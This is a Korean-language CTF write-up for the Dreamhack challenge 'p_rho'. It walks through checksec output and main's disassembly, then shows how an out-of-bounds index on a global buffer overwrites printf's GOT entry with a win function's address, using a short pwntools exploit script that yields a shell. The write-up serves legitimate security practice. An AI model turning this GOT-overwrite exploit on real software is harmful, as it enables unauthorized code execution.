# p_rho
- [문제페이지](https://dreamhack.io/wargame/challenges/1617)

## 문제해설

먼저, checksec을 살펴보면
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

다음과 같다.

main함수의 어셈블리를 살펴보자.

```x86asm
   endbr64
   push   rbp
   mov    rbp,rsp
   sub    rsp,0x20
   mov    rax,QWORD PTR fs:0x28
   mov    QWORD PTR [rbp-0x8],rax
   xor    eax,eax
   mov    rax,QWORD PTR [rip+0x2e18]        # 0x404050 <stdin@GLIBC_2.2.5>
   mov    ecx,0x0
   mov    edx,0x2
   mov    esi,0x0
   mov    rdi,rax
   call   0x4010b0
   mov    rax,QWORD PTR [rip+0x2dea]        # 0x404040 <stdout@GLIBC_2.2.5>
   mov    ecx,0x0
   mov    edx,0x2
   mov    esi,0x0
   mov    rdi,rax
   call   0x4010b0
   mov    rax,QWORD PTR [rip+0x2dec]        # 0x404060 <stderr@GLIBC_2.2.5>
   mov    ecx,0x0
   mov    edx,0x2
   mov    esi,0x0
   mov    rdi,rax
   call   0x4010b0
   mov    QWORD PTR [rbp-0x10],0x0
   lea    rax,[rip+0xd72]        # 0x40200c
   mov    rdi,rax
   mov    eax,0x0
   call   0x401090
   lea    rax,[rbp-0x18]
   mov    rsi,rax
   lea    rax,[rip+0xd5d]        # 0x402012
   mov    rdi,rax
   mov    eax,0x0
   call   0x4010c0
   mov    rax,QWORD PTR [rbp-0x18]
   mov    rdx,QWORD PTR [rbp-0x10]
   lea    rcx,[rdx*8+0x0]
   lea    rdx,[rip+0x2da7]        # 0x404080 <buf>
   mov    QWORD PTR [rcx+rdx*1],rax
   mov    rax,QWORD PTR [rbp-0x10]
   lea    rdx,[rax*8+0x0]
   lea    rax,[rip+0x2d90]        # 0x404080 <buf>
   mov    rax,QWORD PTR [rdx+rax*1]
   mov    QWORD PTR [rbp-0x10],rax
   nop
   jmp    0x401293 <main+125>
```


계속하여 `val: `을 출력하고 `buf[i] = (input)`을 실행한다. 이후, `i = bug[i]`로 작동한다. 따라서, buf 근처의 got를 overwrite할 수 있다.

```
pwndbg> x/x 0x404080 - 120
0x404008 <printf@got.plt>:      0x00401040
```

buf의 120아래에 printf의 got가 존재하기 때문에 이를 오버라이트 하겠다.

이때, 이 바이너리 내에는 win이라는 함수가 존재한다. 이를 실행하도록 하겠다.

```python
from pwn import *

p = remote("host1.dreamhack.games", 17096)

p.sendline(b'-15')
pause()
p.sendline(b'4198838')

p.interactive()
```

```bash
[+] Starting local process './prob': pid 11081
[*] Paused (press any to continue)
[*] Switching to interactive mode
val: val: $ pwd
/mnt/c/users/samsung/desktop/my/workspace/study/2024_winter_mogakso/hack/dreamhack/p_rho/deploy
```

잘 실행된다.

![alt text](image.png)